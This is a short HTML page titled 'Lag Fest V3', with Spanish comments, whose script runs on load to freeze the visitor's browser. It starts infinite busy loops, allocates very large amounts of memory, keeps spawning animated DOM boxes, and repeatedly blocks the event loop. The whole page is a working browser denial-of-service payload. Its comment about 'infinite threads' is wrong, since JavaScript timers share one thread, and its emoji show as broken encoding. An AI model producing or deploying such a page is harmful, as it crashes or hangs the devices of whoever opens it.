<!DOCTYPE html>
<html>
<head>
  <title>Lag Fest V3 ðŸ”¥</title>
  <style>
    body {
      background: black;
      color: white;
      font-family: monospace;
      overflow: hidden;
    }
    .box {
      width: 100px;
      height: 100px;
      background-color: red;
      position: absolute;
      animation: spin 0.2s linear infinite;
    }
    @keyframes spin {
      from { transform: rotate(0deg) scale(1); }
      to { transform: rotate(360deg) scale(3); }
    }
  </style>
</head>
<body>
  <h1>ðŸ”¥ Invocando el lag... ðŸ”¥</h1>
  <script>
    // CPU STRESS (hilos infinitos)
    function stressCPU() {
      for (let i = 0; i < 16; i++) {
        setTimeout(() => {
          while (true) {
            let x = Math.pow(Math.random(), Math.random());
          }
        }, 10);
      }
    }

    // RAM STRESS (cadenas basura)
    function stressRAM() {
      let ramArray = [];
      for (let i = 0; i < 5000; i++) {
        ramArray.push(new Array(1000000).fill("ðŸ§ ".repeat(100)));
      }
    }

    // DOM & GPU STRESS (cajas animadas infinitas)
    function stressDOMandGPU() {
      setInterval(() => {
        for (let i = 0; i < 500; i++) {
          let div = document.createElement("div");
          div.className = "box";
          div.style.left = Math.random() * window.innerWidth + "px";
          div.style.top = Math.random() * window.innerHeight + "px";
          document.body.appendChild(div);
        }
      }, 300); // Repite y repite
    }

    // EVENT LOOP BLOCKER
    function blockEventLoop() {
      setInterval(() => {
        const end = Date.now() + 2000;
        while (Date.now() < end) {
          // Nada mÃ¡s que bloquear el event loop
        }
      }, 5000);
    }

    // INICIAR TODO
    window.onload = () => {
      stressCPU();
      setTimeout(stressRAM, 500);
      setTimeout(stressDOMandGPU, 1000);
      setTimeout(blockEventLoop, 2000);
    };
  </script>
</body>
</html>
